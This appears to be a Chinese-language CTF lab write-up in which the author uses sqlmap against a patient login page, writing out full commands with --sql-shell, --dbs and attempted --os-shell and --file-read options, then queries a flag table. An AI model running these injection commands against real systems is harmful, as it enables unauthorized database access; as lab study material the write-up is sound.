<p>refer to: <br /><a href="https://yunjing.ichunqiu.com/cve/detail/740?type=1&amp;pay=2 " target="_blank">https://yunjing.ichunqiu.com/cve/detail/740?type=1&amp;pay=2</a>
</p>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230505_080520.png" /></p>
<p>打开页面看一下：是个SQLI</p>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230505_080541.png" /><img src="https://files.sweetysoft.com/blog_images/from_paste_20230505_080552.png" /></p>
<p>看了下提示，是在病人登录页面. （找了其它的链接，没有发现有参数的东东）</p>
<p><br /><img src="https://files.sweetysoft.com/blog_images/from_paste_20230505_083131.png" /></p>
<p>手动测试，并没有发现SQLI报错：</p>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230505_083400.png" /></p>
<p>还是用SQLMAP试一下吧。。。--string 就是登录错误显示的文本好了。</p>
<p>sqlmap -u http://eci-2ze49uvu6avqxhmouatl.cloudeci1.ichunqiu.com/patientlogin.php --data="loginid=patient&amp;password=patient888&amp;submit=Login" -p "loginid" --param-d<br />el="&amp;" --string="Change a few things up and try submitting again"</p>
<p>显示可以发现有SQLI， 但是跑到最后又不行。。。</p>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230505_084245.png" /></p>
<p>运行到第三次后发现了： （加上了--debug ）</p>
<p>完整命令: </p>
<p> sqlmap -u http://eci-2ze49uvu6avqxhmouatl.cloudeci1.ichunqiu.com/patientlogin.php --data="loginid=patient&amp;password=patient888&amp;submit=Login" -p "loginid" --param-del="&amp;" --string="Change a few things up and try submitting again" --debug</p>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230505_084938.png" /></p>
<p>尝试获得flag: </p>
<p>--os-shell 不行</p>
<p>--sql-shell 不行</p>
<p>--file-read=/flags 不行 （ 此时还在猜测 flag 位于 /flag）</p>
<p>看了一下其他人的资料，发现flag 隐藏在db 中。</p>
<p>于是 : </p>
<p>--dbs</p>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230505_090622.png" /></p>
<p>-D ctf --tables&#160;&#160; 进一步查看 cft 数据库下面的 所有 表</p>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230505_092545.png" /></p>
<p>--sql-shell</p>
<p>sqlmap -u http://eci-2ze49uvu6avqxhmouatl.cloudeci1.ichunqiu.com/patientlogin.php --data="loginid=patient&amp;password=patient888&amp;submit=Login" -p "loginid" --param-del="&amp;" --string="Change a few things up and try submitting again" --debug --sql-shell</p>
<p>然后 select * from ctf.flag;</p>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230505_094149.png" /></p>
<p>小结：</p>
<p>1. 不是每个SQLI都是通过 ' 判断的，本例这个加不加' 都一样200</p>
<p>2. 不是每次SQLMAP都会成功的。依赖于网络，本次是3次</p>
<p>3. 不是SQLMAP在前期 报了warning 说该参数可能不可被注入，就一定不可注入的。还是要看后面的结果的.</p>
<p>4. blind 方式获得数据，特别慢。几秒钟才一个字母。</p>
<p>5. blind 方式，貌似无法获得 os shell.&#160; （可以看到sqlmap在多个位置进行尝试） 可以使用 sql shell, 但是获得结果也特别慢。</p>
